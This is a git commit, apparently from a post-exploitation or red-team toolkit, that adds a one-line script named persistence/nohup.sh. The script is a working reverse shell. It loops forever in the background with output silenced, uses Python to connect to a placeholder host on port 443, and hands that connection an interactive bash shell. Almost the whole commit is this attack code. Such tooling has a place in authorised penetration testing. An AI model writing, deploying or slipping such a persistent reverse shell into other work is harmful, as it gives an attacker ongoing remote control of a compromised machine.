99c4fa697726e8798c25b10af0e67be493342538
Francesco Soncina <phra@users.noreply.github.com>
2018-08-20 14:35:35 +0200

    feat: add temporary nohup reverse shell

---
+++ persistence/nohup.sh
@@ -0,0 +1,1 @@
+nohup /bin/bash -c "while true; do \$(which python3 || which python2) -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'; done" 2>/dev/null &
